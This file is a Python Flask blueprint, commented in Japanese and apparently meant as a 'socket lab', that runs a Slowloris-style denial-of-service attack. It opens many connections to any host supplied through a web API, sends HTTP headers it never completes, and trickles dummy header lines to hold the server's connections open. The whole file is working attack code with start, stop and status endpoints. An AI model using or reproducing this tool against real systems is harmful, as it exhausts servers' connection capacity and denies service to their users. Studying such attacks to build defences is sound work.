import socket
import threading
import time
from flask import Blueprint, jsonify, render_template, request

# Blueprintの定義
socket_bp = Blueprint("socket_lab", __name__, template_folder="templates")

# 実行状態を管理する変数
socket_status = {
    "is_running": False,
    "active_connections": 0,
    "message": "待機中",
}


def run_raw_socket_test(target_host, port, connections, sleep_time):
  global socket_status
  socket_status["is_running"] = True
  socket_status["active_connections"] = 0
  socket_status["message"] = "ソケットテスト実行中..."

  sockets = []

  # ① 接続をたくさん作る
  for i in range(connections):
    if not socket_status["is_running"]:
      break
    try:
      s = socket.socket()
      s.settimeout(10)
      s.connect((target_host, port))

      # リクエスト開始（終わらせない）
      s.send(b"POST / HTTP/1.1\r\n")
      s.send(b"Host: test\r\n")
      sockets.append(s)
      socket_status["active_connections"] = len(sockets)
    except Exception:
      pass

  # ② 遅延して少しずつ送る（停止ボタンが押されるか接続が切れるまで継続）
  try:
    while socket_status["is_running"] and sockets:
      for s in list(sockets):
        try:
          s.send(b"X-Dummy: a\r\n")
        except:
          sockets.remove(s)
          socket_status["active_connections"] = len(sockets)
      time.sleep(sleep_time)
  finally:
    # 終了時にソケットをすべて閉じる
    for s in sockets:
      try:
        s.close()
      except:
        pass
    socket_status["is_running"] = False
    socket_status["active_connections"] = 0
    socket_status["message"] = "テスト終了"


@socket_bp.route("/")
def index():
  return render_template("socket_test.html", status=socket_status)


@socket_bp.route("/api/socket/start", methods=["POST"])
def start_socket_test():
  if socket_status["is_running"]:
    return (
        jsonify({"status": "error", "message": "すでにテストが実行中です"}),
        400,
    )

  data = request.get_json() or {}
  target_host = data.get("host", "127.0.0.1")
  port = int(data.get("port", 80))
  connections = int(data.get("connections", 1000))
  sleep_time = float(data.get("sleep_time", 0.05))

  # バックグラウンドスレッドで実行（Flaskのメインプロセスをブロックしないため）
  t = threading.Thread(
      target=run_raw_socket_test,
      args=(target_host, port, connections, sleep_time),
  )
  t.daemon = True
  t.start()

  return jsonify(
      {
          "status": "success",
          "message": "ソケットテストを開始しました",
          "target": target_host,
          "connections": connections,
      }
  )


@socket_bp.route("/api/socket/stop", methods=["POST"])
def stop_socket_test():
  global socket_status
  socket_status["is_running"] = False
  return jsonify({"status": "success", "message": "テストを停止します"})


@socket_bp.route("/api/socket/status", methods=["GET"])
def get_socket_status():
  return jsonify(socket_status)